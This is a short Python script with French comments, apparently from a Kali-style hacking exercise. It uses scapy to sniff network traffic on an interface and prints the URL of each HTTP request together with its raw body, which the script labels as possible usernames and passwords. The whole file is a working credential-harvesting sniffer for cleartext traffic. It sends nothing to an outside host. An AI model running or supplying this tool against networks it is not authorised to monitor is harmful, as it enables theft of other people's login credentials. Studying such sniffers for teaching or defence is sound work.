# -*- coding: utf-8 -*-
# "python sniffer.py -iface eth0" sur un terminal en ROOT pour executer ce script (la commande peut varier en fonction de l'OS et de l'interface réseau)

import argparse
from scapy.all import *
from scapy.layers import http

parser = argparse.ArgumentParser(description='Analyse réseau')
parser.add_argument('-iface', dest="iface", help='Interface réseau à écouter', required=False, default="eth0") # eth0 sur kali / modifier en fonction de l'OS
args = parser.parse_args()

def sniffer(interface):
    scapy.all.sniff(iface=interface, prn=callback, store=False)
    print("Sniffing sur l'interface {}".format(interface))



def callback(packet):
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(Raw):
            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
            print("[+] HTTP Request >> " + str(url))
            print("[+] Possible identifiant/mot de passe >> " + str(packet[Raw].load))

if args.iface:
    sniffer(args.iface)